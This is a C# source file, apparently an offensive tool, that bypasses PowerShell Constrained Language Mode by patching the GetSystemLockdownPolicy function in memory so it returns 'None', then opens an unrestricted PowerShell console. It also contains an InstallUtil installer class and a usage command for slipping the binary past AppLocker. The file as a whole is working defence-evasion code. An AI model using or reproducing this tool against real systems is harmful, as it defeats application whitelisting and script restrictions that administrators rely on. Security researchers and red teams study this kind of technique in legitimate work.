using System;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;

namespace loader
{

    public class MainClass
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetStdHandle(int nStdHandle);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        public static void Main(string[] args)
        {
            go();
        }

        public static void go()
        {
            // Find a reference to the automation assembly
            var Automation = typeof(System.Management.Automation.Alignment).Assembly;
            // Get a MethodInfo reference to the GetSystemLockdownPolicy method
            var get_lockdown_info = Automation.GetType("System.Management.Automation.Security.SystemPolicy").GetMethod("GetSystemLockdownPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
            // Retrieve a handle to the method
            var get_lockdown_handle = get_lockdown_info.MethodHandle;
            uint lpflOldProtect;

            // This ensures the method is JIT compiled
            RuntimeHelpers.PrepareMethod(get_lockdown_handle);
            // Get a pointer to the compiled function
            var get_lockdown_ptr = get_lockdown_handle.GetFunctionPointer();

            // Ensure we can write to the address
            VirtualProtect(get_lockdown_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);

            // Write the instructions "mov rax, 0; ret". This returns 0, which is the same as returning SystemEnforcementMode.None
            var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
            Marshal.Copy(new_instr, 0, get_lockdown_ptr, 4);

            // Run powershell from the current process (won't start powershell.exe, but run from the powershell .Net libraries)
            Microsoft.PowerShell.ConsoleShell.Start(System.Management.Automation.Runspaces.RunspaceConfiguration.Create(), "Banner", "Help", new string[] { });
        }
    }

    // This class is used if you need to load this with InstallUtil to bypass AppLocker.
    // usage: InstallUtil.exe /logfile= /LogToConsole=false /U "C:\Windows\Tasks\bypass-clm.exe"
    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);

            MainClass.go();
        }
    }

}
